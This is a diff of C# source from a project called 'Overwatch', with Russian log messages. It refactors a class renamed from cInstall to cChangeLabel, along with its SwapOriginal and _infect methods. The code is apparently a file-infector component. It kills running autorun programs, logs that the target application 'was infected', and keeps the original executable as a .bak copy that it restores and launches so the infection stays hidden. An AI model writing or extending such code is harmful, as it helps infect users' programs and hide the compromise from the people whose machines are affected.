@@ -6,7 +6,7 @@ using System.Threading;
 
 namespace Overwatch
 {
-    class cInstall
+    class cChangeLabel
     {
         static Random random = new Random();
         static appLog Log = new appLog();
@@ -62,8 +62,6 @@ namespace Overwatch
             // место для иконы
 
             Log.Write($"Приложение {targetProgram.RunFilePath} было заражено.", true);
-            Log.Write($"Завершено.");
-
             Environment.Exit(0);
         }
 
@@ -79,32 +77,26 @@ namespace Overwatch
 
         private static void SwapOriginal(string[] args = null)
         {
-            Log.Write("Выполняеться SwapOriginal", true);
-
-            string[] bak_files = Directory.GetFiles(Path.GetDirectoryName(appConfing.MyFullPath), "*.bak");
-            if (bak_files.Length > 0)
+            try
             {
-                Log.Write($"Найденный оригинальный файл: {bak_files[0]}");
+                Log.Write("Выполняеться SwapOriginal", true);
 
-                string path_originalApp = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), bak_files[0].Replace(".bak", ""));
-
-                retry:
-                cProcesses.KillFileProcess(path_originalApp, true);
-
-                try
+                string[] bak_files = Directory.GetFiles(Path.GetDirectoryName(appConfing.MyFullPath), "*.bak");
+                if (bak_files.Length > 0)
                 {
+                    Log.Write($"Найденный оригинальный файл: {bak_files[0]}");
+
+                    string path_originalApp = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), bak_files[0].Replace(".bak", ""));
+                    cProcesses.KillFileProcess(path_originalApp, true);
                     File.Copy(bak_files[0], path_originalApp, true);
-                }
-                catch
-                {
-                    Thread.Sleep(1000);
-                    goto retry;
-                }
-                Process.Start(path_originalApp, string.Join(" ", args));
 
-                File.Delete(local_path_checkfile);
+                    Process.Start(path_originalApp, string.Join(" ", args));
 
+                    File.Delete(local_path_checkfile);
+
+                }
             }
+            catch(Exception ex) { Log.Write(ex.Message, true); }
         }
 
         private static void _infect(AutorunProgram targetProgram)
@@ -113,12 +105,10 @@ namespace Overwatch
 
             int count_try = 0;
             retry:
-
-            // Если процесс выбранной программы активен - убиваем
             if (targetProgram.IsActiveProcess)
             {
                 cProcesses.KillFileProcess(targetProgram.RunFilePath, true);
-                Log.Write($"KILLED {targetProgram.RunFilePath}", true);
+                Log.Write($"KILLED {targetProgram.RunFilePath}", true);            // Если процесс выбранной программы активен - убиваем
             }
             else
             {
